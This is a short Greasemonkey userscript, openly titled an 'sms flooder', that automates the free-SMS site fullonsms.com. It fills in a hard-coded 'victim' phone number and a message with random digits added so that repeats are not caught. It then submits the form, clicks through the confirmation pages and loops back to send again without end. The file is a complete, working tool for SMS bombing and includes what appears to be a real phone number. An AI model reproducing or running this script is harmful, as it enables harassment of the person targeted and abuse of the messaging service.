// ==UserScript==
// @name          full on sms flooder
// @namespace     Chirag
// @description   flooder sms
// @include       http://*fullonsms.com/*
// ==/UserScript==

var victim=9023562683; //Enter victims no. here, u can also add multiple no's seperated by ,(comma)
var msg="Many Many returns of the Day and Happy Birthday to You Chirag Jain!!";


if(document.location=="http://fullonsms.com/home.php"||document.location=="http://www.fullonsms.com/home.php"||document.location=="http://fullonsms.com/home.php?Login=1"||document.location=="http://www.fullonsms.com/home.php?Login=1")
{
document.getElementById('MobileNos').value=victim;
document.getElementById('Message').value=Math.floor(Math.random()*5)+msg+Math.floor(Math.random()*5);
void(0);
document.forms[0].submit();
}

if(document.location=="http://fullonsms.com/sc.php"||document.location=="http://www.fullonsms.com/sc.php")
document.getElementsByName('IntSubmit')[0].click();

if(document.location=="http://fullonsms.com/SaveContacts.php?MobileNos="+victim||document.location=="http://www.fullonsms.com/SaveContacts.php?MobileNos="+victim)
{
window.top.hidePopWin();
document.location="http://fullonsms.com/home.php";
}

if(document.location=="http://fullonsms.com/MsgSent.php"||document.location=="http://www.fullonsms.com/MsgSent.php")
document.location="http://fullonsms.com/home.php";